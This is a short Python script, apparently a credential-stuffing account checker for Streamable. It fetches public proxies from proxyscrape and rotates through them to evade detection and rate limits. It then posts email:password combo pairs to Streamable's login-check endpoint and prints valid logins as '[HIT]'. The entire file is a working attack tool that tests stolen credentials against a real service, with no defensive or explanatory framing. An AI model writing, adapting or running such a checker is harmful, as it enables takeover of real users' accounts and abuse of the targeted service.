import random
import requests

def get_proxy():
    url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
    r = requests.get(url).text.split()
    return r

proxylist = get_proxy()

def get_random_proxy():
    return {'http':f'http://{random.choice(proxylist)}','https':f'http://{random.choice(proxylist)}'}

def proxy_requests(type,url,**kwargs):
    session = requests.session()
    while 1:
        try:
            proxy = get_random_proxy()
            r = session.request(type, url, proxies=proxy, timeout=5, **kwargs).json()
            break
        except:
            print("Proxy Error")
            pass
    return r

def checker(combo):
    email = combo.split(":")[0]
    password = combo.split(":")[1]

    url = 'https://ajax.streamable.com/check'
    post_data = {
        "username": email,
        "password": password
    }

    r = proxy_requests('post',url, json=post_data)

    if "ad_tags" in r:
        print(f'[HIT] {email}:{password}')


checker("email@gmail.com:123456")